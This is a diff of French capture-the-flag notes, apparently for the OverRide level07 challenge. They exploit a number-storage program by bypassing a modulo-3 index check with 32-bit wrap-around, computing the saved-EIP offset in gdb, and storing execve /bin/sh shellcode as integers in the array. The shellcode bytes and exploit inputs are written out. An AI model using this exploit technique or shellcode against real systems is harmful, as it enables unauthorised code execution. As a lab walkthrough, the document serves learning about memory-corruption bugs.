@@ -32,11 +32,6 @@ Input command: store
  *** ERROR! ***
    This index is reserved for wil!
  *** ERROR! ***
- Failed to do store command
-Input command: srore
- Failed to do srore command
-Input command: 100
- Failed to do 100 command
 Input command: store
  Number: 100
  Index: 100
@@ -55,11 +50,14 @@ Input command: read
  Completed read command successfully
 Input command:
 
+
+On peut donc lire deppuis le tableau storage[100] 
+
     uint32_t storage[100]; // Array de 400 octets
 	ou
 	_BYTE v6[400]; // [esp+24h] [ebp-1B8h] BYREF
 
-ebp-1B8h est plus stable donc:
+ebp-1B8h est plus stable donc on vas recuperer son addresse:
 
 (gdb) b *0x080487e0
 Breakpoint 1 at 0x80487e0
@@ -83,19 +81,23 @@ Stack level 0, frame at 0xffffd710:
   ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
 (gdb)
 
-eip at 0xffffd70c
+saved eip est stocker dans 0xffffd70c
 
+
+on fait la soustraction pour trouver l'offset entre le debut de storage et eip
 Hex value:
 d70c – d550 = 1BC
-
 Decimal value:
 55052 – 54608 = 444
 
-(0xffffd70c - 0xffffd550) / 4 = 444 / 4 = 111
+(0xffffd70c - 0xffffd550) / 4(octets par case du tableau de int) = 444 / 4 = 111
 
 donc offset de 111
 
+
 et 111%3=0
+sachant que le code fait un check sur le modulo 3 pour savoir si l'index est reservé pour wil on ne peut pas utiliser 111
+if ((index % 3 == 0) || ((number >> 24) == 0xB7))
 
 Input command: store
  Number: 111
@@ -104,6 +106,7 @@ Input command: store
    This index is reserved for wil!
  *** ERROR! ***
  Failed to do store command
+
 
 donc pour utiliser 111 on est bloquer
 mais on peut utiliser le wrap around pour contourner le check du modulo 3
@@ -135,8 +138,8 @@ donc
 au lieu d'avoir ajouter 1 et d'etre passer de 15 a 16 
 nous sommes passee de 15 a 0 
  0 0 0 0
-
 c'est ce qui se passe avec le wrap around
+
 
 2^32 c'est la valeur max que peut gerer le processeur
 quand il accede a une case d'un tableau: 
@@ -144,7 +147,7 @@ quand il accede a une case d'un tableau:
 le processeur fait un calcul: 
 	addresse de storage[index] = adresse de storage + (index * 4)
 
-Si l'on ajoute $2^{30}$ à n'importe quel index, le produit par 4 
+Si l'on ajoute 2^30 à n'importe quel index, le produit par 4 
  entraînera une boucle exacte autour de l'espace d'adressage 32 bits 
  2^30 * 4 = 2^32 = 0
 
@@ -159,66 +162,17 @@ Offset calculé par le processeur = (1073741935 * 4) 2^32 =
 
 1073741935 % 3 == 1 et != 0
 
-donc on a notre index 1073741935(111 avec bypass de %3)
+donc on a notre index 1073741935(111 avec bypass du %3)
 
-il nous faut une adresse ne commençant pas par 0xB7 ou est 
-generalement stocker la libc donc on doit passer par une var d'env.
+il nous faut une adresse ne commençant pas par 0xB7 ou est generalement stocker la libc donc on peut essayer de passer par une var d'env.
 
-https://www.exploit-db.com/exploits/45290
-\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x7f\x40\x2f\x62\x69\x6e\x2f\x73\x68\x41
+mais ca ne fonctionne pas car le code efface les var d'env en mémoire
 
-
-level07@OverRide:/tmp$ nano shell_gen.py
-level07@OverRide:/tmp$ export shellcode=$(python /tmp/shell_gen.py)
-level07@OverRide:/tmp$ env | grep shell
-shellcode=����������������������������������������H1�VH�/bin//shWT_j;X�
-level07@OverRide:/tmp$ nano get.c
-level07@OverRide:/tmp$ gcc -m32 get.c
-level07@OverRide:/tmp$ ./a.out
-0xffffdeed
-
-0xffffdeed on a notre adresse
-
-
-level07@OverRide:~$ ./level07
-----------------------------------------------------
-  Welcome to wil's crappy number storage service!
-----------------------------------------------------
- Commands:
-    store - store a number into the data storage
-    read  - read a number from the data storage
-    quit  - exit the program
-----------------------------------------------------
-   wil has reserved some storage :>
-----------------------------------------------------
-
-Input command: store
- Number: 0xffffdeed
- Index: 1073741935
- Completed store command successfully
-Input command: read
- Index: 1073741935
- Number at data[1073741935] is 0
- Completed read command successfully
-Input command:
-
-le programme lit seulement du decimal pas d'hex avec scanf
-    scanf("%u", &res);
-0xffffdeed == 4294958829
-
-
-et on ne peut pas utiliser envp et les vars d'env car il est wipe 
-
-    // Effacement de argv et envp en mémoire
-    // for (; *argv != NULL; argv++)
-    //     memset(*argv, 0, strlen(*argv));
-
-    // for (; *envp != NULL; envp++)
-    //     memset(*envp, 0, strlen(*envp));
-
+    for (; *envp != NULL; envp++)
+        memset(*envp, 0, strlen(*envp));
 
 donc on peut transformer notre shellcode en int qu'on peut stocker 
- dans le tableau storage. 
+ dans le tableau storage.
 
 \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
 24/4 = 6
@@ -274,8 +228,7 @@ Input command: read
  Number at data[114] is 4158936339
  Completed read command successfully
 
-il contient 4158936339 qui en hexa donne F7E45513 qui est une adre valable
-c'est a l'index 114 qu'il y a surement eip 
+il contient 4158936339 qui en hexa donne F7E45513 qui est une adre valable c'est a l'index 114 qu'il y a surement eip 
 
 114 + 2^30 = 114 + 1073741824 = 1073741938
 
@@ -291,41 +244,7 @@ c'est bon on reessaye
 on stock l'adresse du debut du tableau (4294956304) a la place de eip (index 114 == 1073741938)
 
 level07@OverRide:~$ ./level07
-----------------------------------------------------
-  Welcome to wil's crappy number storage service!
-----------------------------------------------------
- Commands:
-    store - store a number into the data storage
-    read  - read a number from the data storage
-    quit  - exit the program
-----------------------------------------------------
-   wil has reserved some storage :>
-----------------------------------------------------
-
-Input command: store
- Number: 1352253489
- Index: 1073741824
- Completed store command successfully
-Input command: store
- Number: 1932472168
- Index: 1
- Completed store command successfully
-Input command: store
- Number: 1647274088
- Index: 2
- Completed store command successfully
-Input command: store
- Number: 3817434729
- Index: 1073741827
- Completed store command successfully
-Input command: store
- Number: 3783873360
- Index: 4
- Completed store command successfully
-Input command: store
- Number: 2160921520
- Index: 5
- Completed store command successfully
+...
 Input command: store
  Number: 4294956304
  Index: 1073741938
@@ -334,9 +253,7 @@ Input command: quit
 Segmentation fault (core dumped)
 level07@OverRide:~$
 
-
-il faut surement ajouter un NOP sled pour viser plus large au cas ou la memoire ne soit pas au meme endroit
-
+on finit par segfault car on pas de NOP sled pour viser plus large
 \x90\x90\x90\x90
 
 inversion de l'ordre des octets (Endianness)
@@ -344,7 +261,6 @@ inversion de l'ordre des octets (Endianness)
 
 hexa to dec
 2425393296
-
 
 et on vas creer un script pour simplifier la rentree des infos 
 
